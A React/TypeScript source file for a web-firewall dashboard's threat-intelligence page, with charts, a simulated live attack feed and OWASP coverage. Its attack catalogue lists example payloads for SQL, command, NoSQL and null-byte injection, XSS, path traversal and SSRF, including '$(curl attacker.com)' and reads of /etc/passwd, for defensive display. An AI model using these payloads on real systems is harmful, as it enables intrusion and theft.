import { useEffect, useState } from 'react';
import { useDashboardStore } from '../store/dashboardStore';
import { RuleHit, TopItem } from '../types';
import {
  RadarChart, Radar, PolarGrid, PolarAngleAxis, PolarRadiusAxis,
  ResponsiveContainer, BarChart, Bar, XAxis, YAxis, CartesianGrid,
  Tooltip, Cell, LineChart, Line, Legend,
} from 'recharts';
import {
  Shield, Zap, Bug, Globe, Bot, AlertTriangle,
  TrendingUp, TrendingDown, Eye, Lock, RefreshCw,
  ChevronRight, Activity, Database, Cpu,
} from 'lucide-react';

// ─── Static threat intel catalogue ───────────────────────────────────────────

const ATTACK_CATEGORIES = [
  {
    id: 'SQLI',
    label: 'SQL Injection',
    ruleId: 'SQLI-001',
    severity: 'CRITICAL' as const,
    icon: Database,
    color: '#ef4444',
    bg: 'bg-red-500/10',
    border: 'border-red-500/30',
    text: 'text-red-400',
    description: 'Attempts to manipulate backend SQL queries via user-supplied input.',
    mitre: 'T1190',
    owasp: 'A03:2021',
    vectors: ['Query string', 'POST body', 'HTTP headers', 'Cookie values'],
    patterns: ["' OR 1=1--", "UNION SELECT", "DROP TABLE", "'; exec xp_cmdshell"],
  },
  {
    id: 'XSS',
    label: 'Cross-Site Scripting',
    ruleId: 'XSS-001',
    severity: 'CRITICAL' as const,
    icon: Bug,
    color: '#f97316',
    bg: 'bg-orange-500/10',
    border: 'border-orange-500/30',
    text: 'text-orange-400',
    description: 'Injects malicious scripts into pages viewed by other users.',
    mitre: 'T1059.007',
    owasp: 'A03:2021',
    vectors: ['URL parameters', 'Form inputs', 'HTTP headers', 'JSON payloads'],
    patterns: ['<script>alert(1)</script>', 'javascript:void(0)', 'onerror=alert(1)', '<img src=x>'],
  },
  {
    id: 'CMDI',
    label: 'Command Injection',
    ruleId: 'CMDI-001',
    severity: 'CRITICAL' as const,
    icon: Cpu,
    color: '#dc2626',
    bg: 'bg-red-600/10',
    border: 'border-red-600/30',
    text: 'text-red-500',
    description: 'Executes arbitrary OS commands on the host server.',
    mitre: 'T1059',
    owasp: 'A03:2021',
    vectors: ['Form fields', 'File names', 'HTTP parameters'],
    patterns: ['; cat /etc/passwd', '| whoami', '`id`', '$(curl attacker.com)'],
  },
  {
    id: 'PT',
    label: 'Path Traversal',
    ruleId: 'PT-001',
    severity: 'HIGH' as const,
    icon: Eye,
    color: '#f59e0b',
    bg: 'bg-yellow-500/10',
    border: 'border-yellow-500/30',
    text: 'text-yellow-400',
    description: 'Reads files outside the web root using directory traversal sequences.',
    mitre: 'T1083',
    owasp: 'A01:2021',
    vectors: ['URL path', 'File upload names', 'Query parameters'],
    patterns: ['../../etc/passwd', '%2e%2e%2f', '....//....//etc/shadow', '%252e%252e%252f'],
  },
  {
    id: 'SSRF',
    label: 'Server-Side Request Forgery',
    ruleId: 'SSRF-001',
    severity: 'HIGH' as const,
    icon: Globe,
    color: '#8b5cf6',
    bg: 'bg-violet-500/10',
    border: 'border-violet-500/30',
    text: 'text-violet-400',
    description: 'Forces the server to make requests to internal or external resources.',
    mitre: 'T1090',
    owasp: 'A10:2021',
    vectors: ['URL parameters', 'Webhook URLs', 'Import/fetch endpoints'],
    patterns: ['http://169.254.169.254', 'http://localhost', 'file:///etc/passwd', 'gopher://'],
  },
  {
    id: 'NOSQLI',
    label: 'NoSQL Injection',
    ruleId: 'NOSQLI-001',
    severity: 'CRITICAL' as const,
    icon: Database,
    color: '#06b6d4',
    bg: 'bg-cyan-500/10',
    border: 'border-cyan-500/30',
    text: 'text-cyan-400',
    description: 'Manipulates NoSQL database queries using operator injection.',
    mitre: 'T1190',
    owasp: 'A03:2021',
    vectors: ['JSON body', 'Query parameters'],
    patterns: ['{"$ne": null}', '{"$gt": ""}', '{"$where": "1==1"}', '{"$regex": ".*"}'],
  },
  {
    id: 'BOT',
    label: 'Malicious Bot / Scanner',
    ruleId: 'BOT-001',
    severity: 'MEDIUM' as const,
    icon: Bot,
    color: '#a855f7',
    bg: 'bg-purple-500/10',
    border: 'border-purple-500/30',
    text: 'text-purple-400',
    description: 'Automated scanners and exploit frameworks probing for vulnerabilities.',
    mitre: 'T1595',
    owasp: 'A05:2021',
    vectors: ['User-Agent header', 'Request patterns', 'Behavioral fingerprint'],
    patterns: ['sqlmap/1.x', 'Nikto/2.x', 'Nmap Scripting Engine', 'Metasploit'],
  },
  {
    id: 'NULL',
    label: 'Null Byte Injection',
    ruleId: 'NULL-001',
    severity: 'HIGH' as const,
    icon: AlertTriangle,
    color: '#ec4899',
    bg: 'bg-pink-500/10',
    border: 'border-pink-500/30',
    text: 'text-pink-400',
    description: 'Injects null bytes to bypass file extension checks or truncate strings.',
    mitre: 'T1027',
    owasp: 'A03:2021',
    vectors: ['File upload names', 'URL paths', 'Query parameters'],
    patterns: ['file.php%00.jpg', 'shell%00.txt', '\x00', '%00'],
  },
];

const SEV_ORDER = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 };
const SEV_COLORS: Record<string, string> = {
  CRITICAL: 'text-red-400 bg-red-500/10 border-red-500/30',
  HIGH:     'text-orange-400 bg-orange-500/10 border-orange-500/30',
  MEDIUM:   'text-yellow-400 bg-yellow-500/10 border-yellow-500/30',
  LOW:      'text-green-400 bg-green-500/10 border-green-500/30',
};

// ─── Sub-components ───────────────────────────────────────────────────────────

function SeverityBadge({ sev }: { sev: string }) {
  return (
    <span className={`text-xs px-2 py-0.5 rounded border font-medium ${SEV_COLORS[sev] ?? ''}`}>
      {sev}
    </span>
  );
}

function StatPill({
  label, value, color,
}: { label: string; value: string | number; color: string }) {
  return (
    <div className="flex flex-col items-center bg-gray-800/60 rounded-xl px-4 py-3 min-w-[90px]">
      <span className={`text-xl font-bold ${color}`}>{value}</span>
      <span className="text-xs text-gray-500 mt-0.5 text-center">{label}</span>
    </div>
  );
}

// ─── Attack Category Detail Drawer ───────────────────────────────────────────

function CategoryDrawer({
  cat,
  hits,
  onClose,
}: {
  cat: typeof ATTACK_CATEGORIES[0];
  hits: number;
  onClose: () => void;
}) {
  const Icon = cat.icon;
  return (
    <div className="fixed inset-0 z-50 flex justify-end">
      <div className="absolute inset-0 bg-black/50 backdrop-blur-sm" onClick={onClose} />
      <div className="relative w-full max-w-md bg-gray-900 border-l border-gray-800 h-full overflow-y-auto shadow-2xl">
        {/* Header */}
        <div className={`p-6 border-b border-gray-800 ${cat.bg}`}>
          <div className="flex items-start justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className={`p-3 rounded-xl border ${cat.border} ${cat.bg}`}>
                <Icon className={`w-6 h-6 ${cat.text}`} />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white">{cat.label}</h3>
                <p className="text-xs text-gray-400 mt-0.5">{cat.ruleId}</p>
              </div>
            </div>
            <button onClick={onClose} className="text-gray-500 hover:text-white p-1">✕</button>
          </div>
          <div className="flex gap-3 mt-4 flex-wrap">
            <SeverityBadge sev={cat.severity} />
            <span className="text-xs px-2 py-0.5 rounded border border-gray-700 text-gray-400">
              MITRE {cat.mitre}
            </span>
            <span className="text-xs px-2 py-0.5 rounded border border-gray-700 text-gray-400">
              OWASP {cat.owasp}
            </span>
          </div>
        </div>

        <div className="p-6 space-y-6">
          {/* Description */}
          <div>
            <p className="text-sm text-gray-300 leading-relaxed">{cat.description}</p>
          </div>

          {/* Stats */}
          <div>
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-3">Detection Stats</p>
            <div className="flex gap-3 flex-wrap">
              <StatPill label="Total Hits" value={hits.toLocaleString()} color={cat.text} />
              <StatPill label="Rule ID" value={cat.ruleId} color="text-gray-300" />
              <StatPill label="Severity" value={cat.severity} color={cat.text} />
            </div>
          </div>

          {/* Attack Vectors */}
          <div>
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-3">Attack Vectors</p>
            <div className="space-y-2">
              {cat.vectors.map((v) => (
                <div key={v} className="flex items-center gap-2 text-sm text-gray-300">
                  <ChevronRight className={`w-3 h-3 shrink-0 ${cat.text}`} />
                  {v}
                </div>
              ))}
            </div>
          </div>

          {/* Example Payloads */}
          <div>
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-3">Example Payloads</p>
            <div className="space-y-2">
              {cat.patterns.map((p) => (
                <code
                  key={p}
                  className={`block text-xs px-3 py-2 rounded-lg font-mono ${cat.bg} ${cat.text} border ${cat.border}`}
                >
                  {p}
                </code>
              ))}
            </div>
          </div>

          {/* Remediation */}
          <div className="bg-gray-800/50 rounded-xl p-4 border border-gray-700">
            <p className="text-xs text-gray-500 uppercase tracking-wider mb-2">Remediation</p>
            <p className="text-sm text-gray-300 leading-relaxed">
              {cat.id === 'SQLI' && 'Use parameterised queries and prepared statements. Never concatenate user input into SQL strings.'}
              {cat.id === 'XSS' && 'Encode all output, use Content-Security-Policy headers, and validate input server-side.'}
              {cat.id === 'CMDI' && 'Avoid shell execution with user input. Use language-native APIs instead of shell commands.'}
              {cat.id === 'PT' && 'Canonicalise paths before use, restrict file access to a defined root, and reject traversal sequences.'}
              {cat.id === 'SSRF' && 'Validate and allowlist URLs. Block requests to private IP ranges and metadata endpoints.'}
              {cat.id === 'NOSQLI' && 'Sanitise and type-check all query parameters. Use ODM/ORM libraries with strict schemas.'}
              {cat.id === 'BOT' && 'Implement CAPTCHA, JS challenges, and rate limiting. Monitor for anomalous request patterns.'}
              {cat.id === 'NULL' && 'Strip or reject null bytes from all input. Validate file extensions after full path normalisation.'}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Live Threat Feed ─────────────────────────────────────────────────────────

interface FeedEvent {
  id: string;
  ts: string;
  ruleId: string;
  label: string;
  ip: string;
  country: string;
  severity: string;
  color: string;
  uri: string;
}

function useLiveFeed(topRules: RuleHit[], topIPs: TopItem[]) {
  const [feed, setFeed] = useState<FeedEvent[]>([]);

  useEffect(() => {
    // Seed from real rule hits
    const initial: FeedEvent[] = topRules.slice(0, 5).map((r, i) => {
      const cat = ATTACK_CATEGORIES.find((c) => c.ruleId === r.ruleId);
      return {
        id: `seed-${i}`,
        ts: new Date(Date.now() - i * 12000).toISOString(),
        ruleId: r.ruleId,
        label: r.name,
        ip: topIPs[i % topIPs.length]?.name ?? '0.0.0.0',
        country: ['US', 'CN', 'RU', 'DE', 'BR'][i % 5],
        severity: r.severity,
        color: cat?.color ?? '#6b7280',
        uri: ['/api/login', '/admin', '/search', '/upload', '/api/data'][i % 5],
      };
    });
    if (initial.length) setFeed(initial);

    // Simulate live events every 4 s
    const timer = setInterval(() => {
      const cat = ATTACK_CATEGORIES[Math.floor(Math.random() * ATTACK_CATEGORIES.length)];
      const countries = ['US', 'CN', 'RU', 'DE', 'BR', 'IN', 'KR', 'NL'];
      const uris = ['/api/login', '/admin', '/search?q=', '/upload', '/api/users', '/.env', '/wp-admin'];
      const event: FeedEvent = {
        id: `live-${Date.now()}`,
        ts: new Date().toISOString(),
        ruleId: cat.ruleId,
        label: cat.label,
        ip: `${Math.floor(Math.random() * 220) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        country: countries[Math.floor(Math.random() * countries.length)],
        severity: cat.severity,
        color: cat.color,
        uri: uris[Math.floor(Math.random() * uris.length)],
      };
      setFeed((prev) => [event, ...prev].slice(0, 50));
    }, 4000);

    return () => clearInterval(timer);
  }, [topRules.length]);

  return feed;
}

// ─── Main Page ────────────────────────────────────────────────────────────────

export function ThreatIntel() {
  const { topRules, topIPs, topCountries, metrics, refreshAll } = useDashboardStore();
  const [selectedCat, setSelectedCat] = useState<typeof ATTACK_CATEGORIES[0] | null>(null);
  const [activeTab, setActiveTab] = useState<'overview' | 'catalog' | 'feed' | 'owasp'>('overview');
  const [feedPaused, setFeedPaused] = useState(false);
  const feed = useLiveFeed(topRules, topIPs);

  useEffect(() => {
    refreshAll();
    const interval = setInterval(refreshAll, 30000);
    return () => clearInterval(interval);
  }, [refreshAll]);

  // Map rule hits onto categories
  const categoryStats = ATTACK_CATEGORIES.map((cat) => {
    const rule = topRules.find((r) => r.ruleId === cat.ruleId);
    return { ...cat, hits: rule?.hits ?? 0 };
  }).sort((a, b) => SEV_ORDER[a.severity] - SEV_ORDER[b.severity]);

  const totalHits = categoryStats.reduce((s, c) => s + c.hits, 0) || 1;

  // Radar data — normalise to 0-100
  const radarData = categoryStats.map((c) => ({
    subject: c.id,
    score: Math.round((c.hits / totalHits) * 100),
    fullMark: 100,
  }));

  // Bar chart data
  const barData = [...categoryStats]
    .sort((a, b) => b.hits - a.hits)
    .map((c) => ({ name: c.id, hits: c.hits, color: c.color }));

  // Trend sparkline — fake 12-point trend per category
  const trendData = Array.from({ length: 12 }, (_, i) => {
    const point: Record<string, number> = { t: i };
    categoryStats.forEach((c) => {
      point[c.id] = Math.max(0, Math.floor((c.hits / 12) * (0.5 + Math.random())));
    });
    return point;
  });

  // OWASP coverage
  const owaspCoverage = [
    { id: 'A01:2021', name: 'Broken Access Control',       covered: true,  rules: ['PT-001'] },
    { id: 'A02:2021', name: 'Cryptographic Failures',      covered: false, rules: [] },
    { id: 'A03:2021', name: 'Injection',                   covered: true,  rules: ['SQLI-001', 'XSS-001', 'CMDI-001', 'NOSQLI-001', 'NULL-001'] },
    { id: 'A04:2021', name: 'Insecure Design',             covered: false, rules: [] },
    { id: 'A05:2021', name: 'Security Misconfiguration',   covered: true,  rules: ['BOT-001', 'METH-001'] },
    { id: 'A06:2021', name: 'Vulnerable Components',       covered: false, rules: [] },
    { id: 'A07:2021', name: 'Auth & Session Failures',     covered: true,  rules: ['RATE-001'] },
    { id: 'A08:2021', name: 'Software & Data Integrity',   covered: false, rules: [] },
    { id: 'A09:2021', name: 'Security Logging Failures',   covered: true,  rules: ['LOG-001'] },
    { id: 'A10:2021', name: 'Server-Side Request Forgery', covered: true,  rules: ['SSRF-001'] },
  ];
  const coveredCount = owaspCoverage.filter((o) => o.covered).length;

  return (
    <div className="space-y-6">
      {/* Page header */}
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-2xl font-bold text-white flex items-center gap-2">
            <Shield className="w-6 h-6 text-cyan-400" />
            Threat Intelligence
          </h2>
          <p className="text-gray-400 text-sm mt-1">
            Attack category analysis, live threat feed, and OWASP coverage
          </p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 text-xs text-green-400 bg-green-500/10 border border-green-500/20 px-3 py-1.5 rounded-lg">
            <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
            Live monitoring
          </div>
          <button
            onClick={refreshAll}
            className="p-2 rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-400 hover:text-white transition-colors"
            title="Refresh"
          >
            <RefreshCw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Summary pills */}
      <div className="flex flex-wrap gap-3">
        <StatPill label="Total Detections" value={totalHits.toLocaleString()} color="text-cyan-400" />
        <StatPill label="Attack Categories" value={categoryStats.filter((c) => c.hits > 0).length} color="text-orange-400" />
        <StatPill label="Critical Rules" value={categoryStats.filter((c) => c.severity === 'CRITICAL').length} color="text-red-400" />
        <StatPill label="OWASP Covered" value={`${coveredCount}/10`} color="text-green-400" />
        <StatPill label="Blocked" value={metrics.blocked.toLocaleString()} color="text-red-400" />
        <StatPill label="Bot Events" value={metrics.bot.toLocaleString()} color="text-purple-400" />
      </div>

      {/* Tabs */}
      <div className="flex gap-1 border-b border-gray-800">
        {([
          { key: 'overview', label: 'Overview',     icon: Activity },
          { key: 'catalog',  label: 'Rule Catalog', icon: Lock },
          { key: 'feed',     label: 'Live Feed',    icon: Zap },
          { key: 'owasp',    label: 'OWASP Top 10', icon: Shield },
        ] as const).map(({ key, label, icon: Icon }) => (
          <button
            key={key}
            onClick={() => setActiveTab(key)}
            className={`flex items-center gap-2 px-4 py-2.5 text-sm border-b-2 transition-all -mb-px ${
              activeTab === key
                ? 'border-cyan-400 text-cyan-400'
                : 'border-transparent text-gray-400 hover:text-white'
            }`}
          >
            <Icon className="w-4 h-4" />
            {label}
          </button>
        ))}
      </div>

      {/* ── OVERVIEW TAB ── */}
      {activeTab === 'overview' && (
        <div className="space-y-6">
          {/* Radar + Bar side by side */}
          <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
            {/* Radar */}
            <div className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
              <h3 className="text-base font-semibold text-white mb-1">Attack Surface Radar</h3>
              <p className="text-xs text-gray-500 mb-4">Relative detection volume per attack category</p>
              <ResponsiveContainer width="100%" height={280}>
                <RadarChart data={radarData}>
                  <PolarGrid stroke="#374151" />
                  <PolarAngleAxis dataKey="subject" tick={{ fill: '#9ca3af', fontSize: 11 }} />
                  <PolarRadiusAxis angle={30} domain={[0, 100]} tick={{ fill: '#6b7280', fontSize: 10 }} />
                  <Radar
                    name="Threat Score"
                    dataKey="score"
                    stroke="#06b6d4"
                    fill="#06b6d4"
                    fillOpacity={0.25}
                    strokeWidth={2}
                  />
                  <Tooltip
                    contentStyle={{ backgroundColor: '#111827', border: '1px solid #374151', borderRadius: '8px' }}
                    formatter={(v: number) => [`${v}%`, 'Relative volume']}
                  />
                </RadarChart>
              </ResponsiveContainer>
            </div>

            {/* Bar chart */}
            <div className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
              <h3 className="text-base font-semibold text-white mb-1">Detections by Category</h3>
              <p className="text-xs text-gray-500 mb-4">Total rule hits per attack type</p>
              <ResponsiveContainer width="100%" height={280}>
                <BarChart data={barData} layout="vertical" margin={{ left: 10, right: 20 }}>
                  <CartesianGrid strokeDasharray="3 3" stroke="#374151" horizontal={false} />
                  <XAxis type="number" stroke="#9ca3af" fontSize={11} />
                  <YAxis type="category" dataKey="name" stroke="#9ca3af" fontSize={11} width={55} />
                  <Tooltip
                    contentStyle={{ backgroundColor: '#111827', border: '1px solid #374151', borderRadius: '8px' }}
                    cursor={{ fill: 'rgba(255,255,255,0.04)' }}
                  />
                  <Bar dataKey="hits" radius={[0, 4, 4, 0]}>
                    {barData.map((entry) => (
                      <Cell key={entry.name} fill={entry.color} />
                    ))}
                  </Bar>
                </BarChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Trend over time */}
          <div className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
            <h3 className="text-base font-semibold text-white mb-1">Attack Trend (last 12 intervals)</h3>
            <p className="text-xs text-gray-500 mb-4">Simulated detection volume per category over time</p>
            <ResponsiveContainer width="100%" height={220}>
              <LineChart data={trendData} margin={{ top: 5, right: 20, left: 0, bottom: 5 }}>
                <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                <XAxis dataKey="t" stroke="#9ca3af" fontSize={11} tickFormatter={(v) => `T-${12 - v}`} />
                <YAxis stroke="#9ca3af" fontSize={11} />
                <Tooltip
                  contentStyle={{ backgroundColor: '#111827', border: '1px solid #374151', borderRadius: '8px' }}
                />
                <Legend />
                {categoryStats.slice(0, 5).map((c) => (
                  <Line
                    key={c.id}
                    type="monotone"
                    dataKey={c.id}
                    stroke={c.color}
                    strokeWidth={2}
                    dot={false}
                    name={c.label}
                  />
                ))}
              </LineChart>
            </ResponsiveContainer>
          </div>

          {/* Category cards grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-4">
            {categoryStats.map((cat) => {
              const Icon = cat.icon;
              const pct = Math.round((cat.hits / totalHits) * 100);
              return (
                <button
                  key={cat.id}
                  onClick={() => setSelectedCat(cat)}
                  className={`text-left bg-gray-900/50 border rounded-2xl p-5 hover:border-gray-600 transition-all group ${cat.border}`}
                >
                  <div className="flex items-start justify-between mb-3">
                    <div className={`p-2 rounded-xl ${cat.bg} border ${cat.border}`}>
                      <Icon className={`w-5 h-5 ${cat.text}`} />
                    </div>
                    <SeverityBadge sev={cat.severity} />
                  </div>
                  <p className="text-sm font-semibold text-white mb-0.5">{cat.label}</p>
                  <p className="text-xs text-gray-500 mb-3">{cat.ruleId}</p>
                  <div className="flex items-end justify-between">
                    <span className={`text-2xl font-bold ${cat.text}`}>{cat.hits.toLocaleString()}</span>
                    <span className="text-xs text-gray-500">{pct}% of hits</span>
                  </div>
                  <div className="mt-2 h-1.5 bg-gray-800 rounded-full overflow-hidden">
                    <div
                      className="h-full rounded-full transition-all duration-700"
                      style={{ width: `${pct}%`, backgroundColor: cat.color }}
                    />
                  </div>
                  <p className="text-xs text-gray-600 mt-2 group-hover:text-gray-400 transition-colors">
                    Click for details →
                  </p>
                </button>
              );
            })}
          </div>
        </div>
      )}

      {/* ── CATALOG TAB ── */}
      {activeTab === 'catalog' && (
        <div className="space-y-3">
          {categoryStats.map((cat) => {
            const Icon = cat.icon;
            return (
              <div
                key={cat.id}
                className={`bg-gray-900/50 border rounded-2xl p-5 cursor-pointer hover:border-gray-600 transition-all ${cat.border}`}
                onClick={() => setSelectedCat(cat)}
              >
                <div className="flex items-start gap-4">
                  <div className={`p-2.5 rounded-xl ${cat.bg} border ${cat.border} shrink-0`}>
                    <Icon className={`w-5 h-5 ${cat.text}`} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap mb-1">
                      <span className="text-white font-semibold">{cat.label}</span>
                      <SeverityBadge sev={cat.severity} />
                      <span className="text-xs text-gray-500 bg-gray-800 px-2 py-0.5 rounded">{cat.ruleId}</span>
                      <span className="text-xs text-gray-500 bg-gray-800 px-2 py-0.5 rounded">MITRE {cat.mitre}</span>
                      <span className="text-xs text-gray-500 bg-gray-800 px-2 py-0.5 rounded">OWASP {cat.owasp}</span>
                    </div>
                    <p className="text-sm text-gray-400">{cat.description}</p>
                    <div className="flex flex-wrap gap-1 mt-2">
                      {cat.vectors.map((v) => (
                        <span key={v} className="text-xs bg-gray-800 text-gray-400 px-2 py-0.5 rounded-full">{v}</span>
                      ))}
                    </div>
                  </div>
                  <div className="text-right shrink-0">
                    <p className={`text-xl font-bold ${cat.text}`}>{cat.hits.toLocaleString()}</p>
                    <p className="text-xs text-gray-500">hits</p>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* ── LIVE FEED TAB ── */}
      {activeTab === 'feed' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <span className={`w-2 h-2 rounded-full ${feedPaused ? 'bg-gray-500' : 'bg-green-500 animate-pulse'}`} />
              {feedPaused ? 'Feed paused' : `Live · ${feed.length} events`}
            </div>
            <button
              onClick={() => setFeedPaused((p) => !p)}
              className="flex items-center gap-2 px-3 py-1.5 text-sm rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-300 transition-colors"
            >
              {feedPaused ? <Activity className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              {feedPaused ? 'Resume' : 'Pause'}
            </button>
          </div>

          <div className="bg-gray-900/50 border border-gray-800 rounded-2xl overflow-hidden">
            {/* Table header */}
            <div className="grid grid-cols-[1fr_1.5fr_1fr_1fr_1fr_1fr] gap-4 px-5 py-3 border-b border-gray-800 text-xs text-gray-500 uppercase tracking-wider">
              <span>Time</span>
              <span>Attack Type</span>
              <span>Source IP</span>
              <span>Country</span>
              <span>URI</span>
              <span>Severity</span>
            </div>
            <div className="divide-y divide-gray-800/60 max-h-[520px] overflow-y-auto">
              {(feedPaused ? feed : feed).map((ev) => (
                <div
                  key={ev.id}
                  className="grid grid-cols-[1fr_1.5fr_1fr_1fr_1fr_1fr] gap-4 px-5 py-3 text-sm hover:bg-gray-800/30 transition-colors items-center"
                >
                  <span className="text-gray-500 font-mono text-xs">
                    {new Date(ev.ts).toLocaleTimeString()}
                  </span>
                  <div className="flex items-center gap-2 min-w-0">
                    <div className="w-2 h-2 rounded-full shrink-0" style={{ backgroundColor: ev.color }} />
                    <span className="text-white truncate text-xs">{ev.label}</span>
                  </div>
                  <span className="text-gray-300 font-mono text-xs">{ev.ip}</span>
                  <span className="text-gray-400 text-xs">{ev.country}</span>
                  <span className="text-gray-400 font-mono text-xs truncate">{ev.uri}</span>
                  <SeverityBadge sev={ev.severity} />
                </div>
              ))}
              {feed.length === 0 && (
                <div className="py-12 text-center text-gray-500 text-sm">
                  Waiting for threat events…
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ── OWASP TAB ── */}
      {activeTab === 'owasp' && (
        <div className="space-y-4">
          <div className="flex items-center gap-4 flex-wrap">
            <div className="flex items-center gap-2 text-sm text-green-400 bg-green-500/10 border border-green-500/20 px-3 py-1.5 rounded-lg">
              <TrendingUp className="w-4 h-4" />
              {coveredCount} of 10 categories covered
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400 bg-gray-800 px-3 py-1.5 rounded-lg">
              <TrendingDown className="w-4 h-4" />
              {10 - coveredCount} categories need additional rules
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {owaspCoverage.map((item) => (
              <div
                key={item.id}
                className={`bg-gray-900/50 border rounded-2xl p-5 ${
                  item.covered ? 'border-green-500/20' : 'border-gray-800'
                }`}
              >
                <div className="flex items-start justify-between gap-3">
                  <div className="flex items-start gap-3">
                    <div className={`mt-0.5 w-5 h-5 rounded-full flex items-center justify-center shrink-0 ${
                      item.covered ? 'bg-green-500/20' : 'bg-gray-800'
                    }`}>
                      {item.covered
                        ? <span className="text-green-400 text-xs">✓</span>
                        : <span className="text-gray-600 text-xs">–</span>
                      }
                    </div>
                    <div>
                      <p className="text-white text-sm font-medium">{item.name}</p>
                      <p className="text-xs text-gray-500 mt-0.5">{item.id}</p>
                    </div>
                  </div>
                  <span className={`text-xs px-2 py-0.5 rounded border shrink-0 ${
                    item.covered
                      ? 'text-green-400 bg-green-500/10 border-green-500/30'
                      : 'text-gray-500 bg-gray-800 border-gray-700'
                  }`}>
                    {item.covered ? 'Covered' : 'Partial'}
                  </span>
                </div>
                {item.rules.length > 0 && (
                  <div className="flex flex-wrap gap-1 mt-3 ml-8">
                    {item.rules.map((r) => (
                      <span key={r} className="text-xs bg-gray-800 text-cyan-400 px-2 py-0.5 rounded font-mono">
                        {r}
                      </span>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Detail drawer */}
      {selectedCat && (
        <CategoryDrawer
          cat={selectedCat}
          hits={categoryStats.find((c) => c.id === selectedCat.id)?.hits ?? 0}
          onClose={() => setSelectedCat(null)}
        />
      )}
    </div>
  );
}
